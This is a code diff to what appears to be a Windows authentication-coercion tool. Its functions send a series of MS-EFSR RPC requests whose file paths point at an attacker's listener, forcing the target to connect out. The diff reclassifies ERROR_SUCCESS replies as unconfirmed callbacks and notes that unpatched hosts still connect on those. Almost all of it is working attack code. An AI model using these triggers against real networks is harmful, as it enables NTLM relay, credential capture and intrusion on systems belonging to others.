@@ -28,8 +28,10 @@ _SUCCESS_STRINGS = ("ERROR_INVALID_NAME",)
 
 # Hosts with the October 2026 update return ERROR_BAD_NETPATH without
 # connecting out, so it no longer proves a callback (p0dalirius/Coercer#110).
-_UNCONFIRMED_CODES = {0x00000035}  # ERROR_BAD_NETPATH
-_UNCONFIRMED_STRINGS = ("ERROR_BAD_NETPATH",)
+# Some functions return ERROR_SUCCESS instead (impacket raises SessionError
+# with code 0); unpatched hosts still connect out on those.
+_UNCONFIRMED_CODES = {0x00000000, 0x00000035}  # ERROR_SUCCESS, ERROR_BAD_NETPATH
+_UNCONFIRMED_STRINGS = ("ERROR_SUCCESS", "ERROR_BAD_NETPATH")
 
 
 def _unconfirmed(name, result):
@@ -46,6 +48,9 @@ def _check_result(name, e):
     if check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS):
         return True
     if check_error(e, _UNCONFIRMED_CODES, _UNCONFIRMED_STRINGS):
+        code = getattr(e, "error_code", None)
+        if code == 0 or (code is None and "ERROR_SUCCESS" in str(e)):
+            return _unconfirmed(name, "ERROR_SUCCESS")
         return _unconfirmed(name, "ERROR_BAD_NETPATH")
     log.debug("%s: %s", name, e)
     return False
@@ -57,7 +62,7 @@ def trigger_open_file_raw(dce, listener, listener_port=445, **kw):
         request["fileName"] = efsr_path(listener, listener_port)
         request["Flag"] = 0
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcOpenFileRaw", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcOpenFileRaw", e)
 
@@ -67,7 +72,7 @@ def trigger_encrypt_file_srv(dce, listener, listener_port=445, **kw):
         request = EfsRpcEncryptFileSrv()
         request["FileName"] = efsr_path(listener, listener_port)
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcEncryptFileSrv", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcEncryptFileSrv", e)
 
@@ -78,7 +83,7 @@ def trigger_decrypt_file_srv(dce, listener, listener_port=445, **kw):
         request["FileName"] = efsr_path(listener, listener_port)
         request["Flag"] = 0
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcDecryptFileSrv", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcDecryptFileSrv", e)
 
@@ -88,7 +93,7 @@ def trigger_query_users_on_file(dce, listener, listener_port=445, **kw):
         request = EfsRpcQueryUsersOnFile()
         request["FileName"] = efsr_path(listener, listener_port)
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcQueryUsersOnFile", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcQueryUsersOnFile", e)
 
@@ -98,7 +103,7 @@ def trigger_query_recovery_agents(dce, listener, listener_port=445, **kw):
         request = EfsRpcQueryRecoveryAgents()
         request["FileName"] = efsr_path(listener, listener_port)
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcQueryRecoveryAgents", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcQueryRecoveryAgents", e)
 
@@ -109,7 +114,7 @@ def trigger_remove_users_from_file(dce, listener, listener_port=445, **kw):
         request["FileName"] = efsr_path(listener, listener_port)
         request["Users"] = ENCRYPTION_CERTIFICATE_HASH_LIST()
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcRemoveUsersFromFile", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcRemoveUsersFromFile", e)
 
@@ -120,7 +125,7 @@ def trigger_add_users_to_file(dce, listener, listener_port=445, **kw):
         request["FileName"] = efsr_path(listener, listener_port)
         request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcAddUsersToFile", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcAddUsersToFile", e)
 
@@ -131,7 +136,7 @@ def trigger_file_key_info(dce, listener, listener_port=445, **kw):
         request["FileName"] = efsr_path(listener, listener_port)
         request["infoClass"] = 0
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcFileKeyInfo", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcFileKeyInfo", e)
 
@@ -147,7 +152,7 @@ def trigger_duplicate_encryption_info_file(dce, listener, listener_port=445, **k
         request["RelativeSD"] = EFS_RPC_BLOB()
         request["bInheritHandle"] = 0
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcDuplicateEncryptionInfoFile", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcDuplicateEncryptionInfoFile", e)
 
@@ -159,7 +164,7 @@ def trigger_add_users_to_file_ex(dce, listener, listener_port=445, **kw):
         request["FileName"] = efsr_path(listener, listener_port)
         request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcAddUsersToFileEx", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcAddUsersToFileEx", e)
 
@@ -172,6 +177,6 @@ def trigger_file_key_info_ex(dce, listener, listener_port=445, **kw):
         request["FileName"] = efsr_path(listener, listener_port)
         request["InfoClass"] = 0
         dce.request(request)
-        return True
+        return _unconfirmed("EfsRpcFileKeyInfoEx", "ERROR_SUCCESS")
     except Exception as e:
         return _check_result("EfsRpcFileKeyInfoEx", e)
